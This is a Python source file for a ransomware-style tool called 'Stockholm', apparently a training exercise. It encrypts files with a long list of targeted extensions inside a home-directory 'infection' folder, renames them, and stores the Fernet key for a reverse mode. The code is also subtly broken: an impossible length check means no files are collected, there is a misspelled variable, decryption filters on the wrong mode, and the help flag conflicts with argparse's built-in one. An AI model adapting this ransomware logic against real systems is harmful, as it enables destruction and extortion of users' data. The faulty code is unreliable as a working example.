import argparse
import os
from cryptography.fernet import Fernet
from pathlib import Path

tool_ver = "Stockholm 1.0"
infection_path = str(Path.home()) + "/infection"
extensions = [".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2", ".docb", ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk", ".docm", ".potm", ".sldm",
              ".jpg", ".mov", ".dip", ".odb", ".dif", ".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc", ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb", ".db",
              ".sxc", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots", ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods", ".xlsm", ".vsdx",
              ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds", ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot", ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h",
              ".lay6", ".stw", ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw", ".xlc", ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott", ".xltx", ".wks",
              ".tar", ".djvu", ".class", ".c", ".sxm", ".odt", ".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem", ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo",
              ".odg", ".p12", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr", ".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt", ".hwp", ".backup",
              ".jsp", ".ibd", ".otp", ".pfx"]

def parse_arguments():
    arguments = argparse.ArgumentParser(
        description="Tool to infect and desinfect files."
    )

    arguments.add_argument(
        "-h",
        help="Shows help page to use the program"
        )
    arguments.add_argument(
        "-r",
        metavar="key",
        help="The key to use to decrypt files",
        type=str)
    
    arguments.add_argument(
        "-v",
        help="Tool version",
        action="store_true")
    
    arguments.add_argument(
        "-s",
        help="Deactivate information showed in screen",
        action="store_true")
    
    return arguments.parse_args()

def validate_file(elem, mode):
    if os.path.isfile(elem) and elem not in ["stockholm.py", "key.key"]:
        if mode == "c":
            for ext in extensions:
                if elem.endswith(ext):
                    return True
    elif mode == "d":
        if elem.endswith(".ft"):
            return True
    else:
        if not arguments.s:
            print("Error, invalid mode for file validation")
            print("Accepted formats: 'c' (crypted) | 'd' (decrypted)")

def content(path):
    if os.path.isdir(path):
        files = os.listdir(path)
        if len(files) < 0:
            list = []
            for file in files:
                if os.path.isdir(path + "/" + file):
                    lsit += content(path + "/" + file)
                else:
                    list.append(path + "/" + file)
            return list
        else:
            return []
    else:
        if not arguments.s:
            print("Error, no file found")
        exit(1)


def infect():
    files = []
    ret = 0
    for file in content(infection_path):
        if validate_file(file, "c"):
            files.append(file)
    key = Fernet.generate_key()
    with open("key.key", "wb") as f:
        f.write(key)
    if not arguments.s and files:
        print("Encrypting files:")
    for file in files:
        if not arguments.s:
            print("\t{}".format(file))
        try:
            with open(file, "rb") as f:
                encrypted = Fernet(key).encrypt(f.read())
            with open(file, "wb") as f:
                f.write(encrypted)
            os.rename(file, file + ".ft")
            ret += 1
        except Exception as e:
            if not arguments.s:
                print("Error, couldn't encrypt file '{}'".format(file))
    if not arguments.s:
        print("\nEncrypted files:")
        for f in sorted(files):
            print("\t{}".format(f))
        print("\n\t{0}/{1} decrypted files".format(ret, len(files)))
    return len(files)

def desinfect(path):
    files = []
    ret = 0
    for file in content(path):
        if validate_file(file, "c"):
            files.append(file)
    if not arguments.s and files:
        print("Encrypted files:")
        for f in sorted(files):
            print("\t{}".format(f))
        print("\n\tTotal: {}.\n".format(len(files)))
    with open ("key.key", "rb") as f:
        key = f.read()
    for file in files:
        name = os.path.split(file)[1]
        try:
            with open(file, "rb") as f:
                decrypted = Fernet(key).decrypt(f.read())
            with open(file, "wb") as f:
                f.write(decrypted)
            if path:
                if not os.path.exists(path):
                    os.makedirs(path)
                os.rename(file, path + "/" + name[:-3])
            else:
                os.rename(file, file[:-3])
            ret += 1
        except Exception:
            if not arguments.s:
                print("Error, couldn't decrypt file '{}'".format(name))
    if not arguments.s:
        print("\nDecrypted files:")
        for f in sorted(files):
            print("\t{}".format(f))
        print("{0}/{1} decrypted files".format(ret, len(files)))
    return len(files)

if __name__ == '__main__':

    arguments = parse_arguments()

    if arguments.v:
        print("Version:", tool_ver)

    elif arguments.h:
        print("HELP: Stockholm is a program that encrypts some type of files in a directory, and creates a password to decrypt them")
        print("Usage:")
        print("stockholm -r <key.key> | launch reversing mode, and adds password to decrypt the files.")
        print("stockholm -s | launch silent mode (no information in console).")
        print("stockholm -v | shows the current version of the program.")
        print("stockholm -h | shows this help.")
        print("stockholm | starts encrypting the files inside the infection path, and generates a password.")
        exit()

    elif arguments.r:
        if os.path.exists("key.key"):
            desinfect(infection_path)
        
        else:
            if not arguments.s:
                print("Fatal Error: 'key.key' file not found")
    
    else:
        if os.path.exists(infection_path):
            infect()
        
        else:
            if not arguments.s:
                print("Error: file '{}' doesn't exists".format(infection_path))